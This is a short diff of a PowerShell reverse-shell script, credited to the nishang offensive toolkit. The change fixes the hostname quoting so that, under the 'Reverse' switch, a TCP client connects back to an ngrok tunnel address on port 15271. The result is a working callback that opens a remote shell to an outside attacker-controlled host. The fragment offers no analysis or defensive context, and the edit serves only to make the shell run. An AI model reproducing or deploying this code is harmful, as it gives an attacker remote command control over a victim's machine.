@@ -66,7 +66,7 @@ https://github.com/samratashok/nishang
         #Connect back if the reverse switch is used.
         if ($Reverse)
         {
-            $client = New-Object System.Net.Sockets.TCPClient(0.tcp.ap.ngrok.io,15271)
+            $client = New-Object System.Net.Sockets.TCPClient("0.tcp.ap.ngrok.io",15271)
         }
 
         #Bind to the provided port if Bind switch is used.
